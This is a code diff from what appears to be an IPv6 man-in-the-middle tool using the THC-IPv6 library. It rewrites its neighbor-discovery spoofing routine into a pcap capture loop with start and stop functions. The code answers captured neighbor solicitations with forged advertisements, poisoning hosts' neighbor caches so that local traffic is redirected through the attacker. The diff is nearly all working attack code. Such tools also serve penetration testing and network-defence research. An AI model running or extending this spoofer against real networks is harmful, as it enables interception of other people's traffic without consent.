@@ -18,24 +18,34 @@
  */
 #include <arpa/inet.h>
 #include <string.h>
+#include <pcap.h>
 
 #include "mitm6.h"
 #include "thc-ipv6.h"
 
 extern char *iface;
+extern pcap_t *pcap;
 
-void ndp_spoof(const u_char *bytes, size_t len)
+static u_char *mac = NULL;
+
+static void proc(u_char *user, const struct pcap_pkthdr *header, const u_char *bytes)
 {
         u_char *buf = (u_char *)bytes;
         u_char *packet = NULL;
         int buflen = 0;
         u_char icmp_data[24];
 
-        u_char *mac = thc_get_own_mac(iface);
-        if (mac == NULL)
-                fatal("unable to get own mac address for %s iface", iface);
+        if (header->len == 0 || bytes == NULL)
+                return;
 
-        if (buf[20] == NXT_ICMP6 && buf[54] == ICMP6_NEIGHBORSOL) {
+        /* Skip truncated packets */
+        if (header->len > CAP_SNAPLEN) {
+                debug("captured truncated packet [pkt-len: %d, snaplen: %d], skipping...",
+                      header->len, CAP_SNAPLEN);
+                return;
+        }
+
+        if (buf[54] == ICMP6_NEIGHBORSOL) {
 
                 packet = thc_create_ipv6(iface, PREFER_LINK, &buflen, buf + 62, buf + 22, 255, 0, 0, 0, 0);
                 if (packet == NULL) {
@@ -58,6 +68,24 @@ void ndp_spoof(const u_char *bytes, size_t len)
                 thc_generate_and_send_pkt(iface, mac, buf + 6, packet, &buflen);
                 packet = thc_destroy_packet(packet);
         }
+}
 
-        free(mac);
+void start_ndp_spoof()
+{
+        mac = thc_get_own_mac(iface);
+        if (mac == NULL)
+                fatal("unable to get own mac address for %s iface", iface);
+        
+        /* Start sniffing */
+        pcap_loop(pcap, 0, &proc, NULL);
+}
+
+void stop_ndp_spoof()
+{
+        if (mac != NULL) {
+                free(mac);
+                mac = NULL;
+        }
+
+        pcap_breakloop(pcap);
 }
